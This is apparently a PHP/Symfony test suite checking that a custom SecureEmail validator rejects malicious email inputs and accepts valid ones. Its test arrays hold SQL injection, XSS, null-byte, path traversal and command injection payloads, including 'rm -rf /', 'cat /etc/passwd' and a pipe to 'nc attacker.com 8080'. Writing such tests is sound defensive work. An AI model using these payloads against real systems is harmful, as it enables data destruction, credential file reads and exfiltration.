<?php

namespace App\Tests;

use App\Validator\Constraints\SecureEmail;
use App\Validator\Constraints\SecureEmailValidator;
use Symfony\Bundle\FrameworkBundle\Test\KernelTestCase;
use Symfony\Component\Validator\Context\ExecutionContextInterface;
use Symfony\Component\Validator\Violation\ConstraintViolationBuilderInterface;
use Symfony\Component\Validator\ConstraintViolationListInterface;
use Symfony\Component\Validator\Constraints as Assert;

class EmailValidationSecurityTest extends KernelTestCase
{
    private $validator;

    protected function setUp(): void
    {
        $kernel = self::bootKernel();
        $this->validator = static::getContainer()->get('validator');
    }

    /**
     * Test that SQL injection payloads are properly rejected
     */
    public function testSqlInjectionPayloadPrevention(): void
    {
        $maliciousEmails = [
            "'; DROP TABLE users; --@domain.com",
            "admin@domain.com'; DELETE FROM users WHERE 1=1; --",
            "user@domain.com' UNION SELECT * FROM passwords --",
            "user@domain.com'; INSERT INTO admin VALUES ('hacker'); --"
        ];

        foreach ($maliciousEmails as $email) {
            $violations = $this->validator->validate($email, [
                new Assert\Email(['mode' => Assert\Email::VALIDATION_MODE_HTML5]),
                new SecureEmail()
            ]);

            $this->assertGreaterThan(
                0, 
                count($violations), 
                "SQL injection payload should be rejected: {$email}"
            );
        }
    }

    /**
     * Test that XSS payloads are properly rejected
     */
    public function testXssPayloadPrevention(): void
    {
        $maliciousEmails = [
            "<script>alert('xss')</script>@domain.com",
            "user@domain.com<script>alert(1)</script>",
            "user+<img src=x onerror=alert(1)>@domain.com",
            "user@<script>document.cookie</script>domain.com"
        ];

        foreach ($maliciousEmails as $email) {
            $violations = $this->validator->validate($email, [
                new Assert\Email(['mode' => Assert\Email::VALIDATION_MODE_HTML5]),
                new SecureEmail()
            ]);

            $this->assertGreaterThan(
                0, 
                count($violations), 
                "XSS payload should be rejected: {$email}"
            );
        }
    }

    /**
     * Test that null byte injection is prevented
     */
    public function testNullByteInjectionPrevention(): void
    {
        $maliciousEmails = [
            "user@domain.com\0",
            "user@domain.com\0.evil.com",
            "user\0@domain.com",
            "\0user@domain.com"
        ];

        foreach ($maliciousEmails as $email) {
            $violations = $this->validator->validate($email, [new SecureEmail()]);

            $this->assertGreaterThan(
                0, 
                count($violations), 
                "Null byte injection should be rejected: " . addcslashes($email, "\0")
            );

            // Check that the specific null byte message is present
            $hasNullByteMessage = false;
            foreach ($violations as $violation) {
                if (str_contains($violation->getMessage(), 'null bytes')) {
                    $hasNullByteMessage = true;
                    break;
                }
            }
            $this->assertTrue($hasNullByteMessage, 'Null byte specific error message should be present');
        }
    }

    /**
     * Test that various malformed email formats are rejected
     */
    public function testMalformedEmailRejection(): void
    {
        $invalidEmails = [
            "invalid@@email.com",  // Double @ symbol
            "user@",               // Missing domain
            "@domain.com",         // Missing local part
            "user@domain..com",    // Double dots in domain
            "user..name@domain.com", // Double dots in local part
            "",                    // Empty string
            "notanemail",          // No @ symbol
            "user@domain@com",     // Multiple @ symbols
            "user name@domain.com", // Spaces in local part
            str_repeat('a', 300) . '@domain.com' // Excessive length
        ];

        foreach ($invalidEmails as $email) {
            $violations = $this->validator->validate($email, [
                new Assert\Email(['mode' => Assert\Email::VALIDATION_MODE_HTML5]),
                new Assert\Length(['max' => 254]),
                new SecureEmail()
            ]);

            $this->assertGreaterThan(
                0, 
                count($violations), 
                "Invalid email format should be rejected: {$email}"
            );
        }
    }

    /**
     * Test that valid emails are accepted
     */
    public function testValidEmailAcceptance(): void
    {
        $validEmails = [
            "user@example.com",
            "test.email@domain.org", 
            "user+tag@example.co.uk",
            "firstname.lastname@company.com",
            "email@123.123.123.123", // IP address domain
            "user@domain-name.com",
            "test@example-one.com"
        ];

        foreach ($validEmails as $email) {
            $violations = $this->validator->validate($email, [
                new Assert\Email(['mode' => Assert\Email::VALIDATION_MODE_HTML5]),
                new Assert\Length(['max' => 254]),
                new SecureEmail()
            ]);

            $this->assertEquals(
                0, 
                count($violations), 
                "Valid email should be accepted: {$email}. Violations: " . 
                implode(', ', array_map(fn($v) => $v->getMessage(), iterator_to_array($violations)))
            );
        }
    }

    /**
     * Test that command injection attempts are rejected
     */
    public function testCommandInjectionPrevention(): void
    {
        $maliciousEmails = [
            "user@domain.com; cat /etc/passwd",
            "user@domain.com && rm -rf /",
            "user@domain.com | nc attacker.com 8080",
            "user@domain.com > /dev/null",
            "user@domain.com < /etc/hosts"
        ];

        foreach ($maliciousEmails as $email) {
            $violations = $this->validator->validate($email, [new SecureEmail()]);

            $this->assertGreaterThan(
                0, 
                count($violations), 
                "Command injection attempt should be rejected: {$email}"
            );
        }
    }

    /**
     * Test that excessive wildcards and suspicious patterns are rejected
     */
    public function testSuspiciousPatternPrevention(): void
    {
        $suspiciousEmails = [
            "user@domain.com***",
            "user@domain.com???",
            "user@domain.com%%%%",
            "user@domain.com...",
            "user@domain.com\\n\\r\\t",
            "user@domain.com%20%20%20",
            'user@domain.com${PATH}',
            'user@domain.com../../../etc/passwd'
        ];

        foreach ($suspiciousEmails as $email) {
            $violations = $this->validator->validate($email, [new SecureEmail()]);

            $this->assertGreaterThan(
                0, 
                count($violations), 
                "Suspicious pattern should be rejected: {$email}"
            );
        }
    }

    /**
     * Test the specific vulnerability mentioned in the ticket
     */
    public function testOriginalVulnerabilityFixed(): void
    {
        // These are the exact examples from the ticket that were previously bypassing validation
        $previouslyBypassingEmails = [
            "'; DROP TABLE users; --@domain.com",
            "<script>alert(\"xss\")</script>@domain.com"
        ];

        foreach ($previouslyBypassingEmails as $email) {
            // Test with both Email constraint and SecureEmail constraint
            $violations = $this->validator->validate($email, [
                new Assert\Email(['mode' => Assert\Email::VALIDATION_MODE_HTML5]),
                new SecureEmail()
            ]);

            $this->assertGreaterThan(
                0, 
                count($violations), 
                "Previously bypassing payload should now be rejected: {$email}"
            );
        }
    }
}